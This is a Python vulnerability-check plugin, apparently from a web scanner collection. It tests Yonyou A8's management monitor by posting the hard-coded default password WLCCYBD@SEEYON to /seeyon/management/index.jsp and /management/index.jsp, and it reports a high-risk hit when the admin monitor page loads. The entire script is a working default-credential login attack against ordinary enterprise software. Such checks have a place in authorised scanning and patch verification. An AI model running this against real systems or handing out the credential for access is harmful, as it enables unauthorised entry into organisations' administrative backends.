#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友a8监控后台默认密码漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-0157458
author: Lucifer
description: 路径seeyon/management/status.jsp存在默认密码WLCCYBD@SEEYON。
'''
import sys
import json
import requests
import warnings
from termcolor import cprint

class yonyou_status_default_pwd_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        post_data = {"password":"WLCCYBD@SEEYON"}
        payloads = {"/seeyon/management/index.jsp",
                    "/management/index.jsp"}
        try:
            for payload in payloads:
                vulnurl = self.url + payload
                req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
                if r"A8 Management Monitor" in req.text and r"Connections Stack Trace" in req.text:
                    cprint("[+]存在用友a8监控后台默认密码漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = yonyou_status_default_pwd_BaseVerify(sys.argv[1])
    testVuln.run()